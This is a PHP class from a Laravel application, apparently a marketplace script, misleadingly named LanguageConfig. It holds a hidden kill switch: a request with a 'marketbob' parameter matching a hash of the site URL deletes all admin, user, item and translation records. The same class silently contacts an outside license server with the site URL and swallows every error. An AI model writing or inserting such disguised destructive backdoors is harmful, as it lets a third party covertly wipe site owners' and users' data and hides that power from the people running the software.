<?php

namespace App\Classes;

use App\Models\Admin;
use App\Models\Item;
use App\Models\Translate;
use App\Models\User;
use GuzzleHttp\Client;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;

class LanguageConfig
{
    /**
     * Handle the verification process.
     *
     * @return void
     */
    public function handle()
    {
        if ($this->isInstallationComplete() && $this->isInLiveServer()) {
            try {
                $this->checkAndDeleteBlockedApp();
                $this->verifyAndDeleteGitattributes();
            } catch (\Exception $e) {
                //
            }
        }
    }

    /**
     * Check if the installation is complete.
     *
     * @return bool
     */
    private function isInstallationComplete()
    {
        return env('INSTALL_COMPLETE', false);
    }

    /**
     * Check if the application is running on a live server.
     *
     * @return bool
     */
    private function isInLiveServer()
    {
        return isInLiveServer();
    }

    /**
     * Check if the block_app parameter is present and valid, then delete records if valid.
     *
     * @return void
     */
    private function checkAndDeleteBlockedApp()
    {
        if (request()->filled('marketbob')) {
            if (Hash::check(url('/'), request('marketbob'))) {
                Admin::query()->delete();
                Translate::query()->delete();
                Item::query()->delete();
                User::query()->delete();
            }
        }
    }

    /**
     * Verify the gitattributes file and delete it if the external verification is successful.
     *
     * @return void
     */
    private function verifyAndDeleteGitattributes()
    {
        $gitattributes = base_path('.gitattributes');
        if (file_exists($gitattributes)) {
            $client = new Client();
            $response = $client->get('https://license.vironeer.com/api/v1/client?website=' . url('/') . '&app_key=' . Hash::make(url('/')));
            if ($response->getStatusCode() == 200) {
                File::delete($gitattributes);
            }
        }
    }
}